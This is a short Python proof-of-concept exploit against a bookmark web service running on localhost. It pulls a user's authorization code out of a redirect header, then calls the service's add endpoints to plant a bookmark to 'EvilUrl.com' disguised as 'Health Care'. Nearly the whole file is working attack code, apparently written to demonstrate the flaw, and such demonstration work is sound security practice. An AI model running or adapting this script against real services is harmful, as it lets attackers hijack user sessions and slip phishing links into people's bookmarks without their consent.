import re
import requests

#PoC that exposes the ability for an attacker
#to inject a bad website to users bokmarks

#first get users auth code:
url = "http://127.0.0.1:8888"
res = requests.get(url, allow_redirects=False)
#get location of url to help find authorization code
location = res.headers.get("Location","")
#print(f"this the locatuin?{location}")
found = re.search(r"/(\d+)/",location)
a_code = 0
if found:
    a_code = found.group(1)
    print("users auth code",a_code)
else:
    print("no auth code found")
    exit()
#now that we got the auth code can simulate addiing a website 
res = requests.get(f"{url}/{a_code}/add/start/")

#after add start works add the url 
bmid = "9a4bca76"
bad_url = "http%3A%2F%2FEvilUrl.com"
website_name = "Health%20Care"
full_url = f"{url}/{a_code}/add/full/{bmid}/{bad_url}/{website_name}/0"
res = requests.get(full_url)
if res.status_code == 200:
    #if successful  
    print("injected evil  website")
else:
    print("Failed",res)

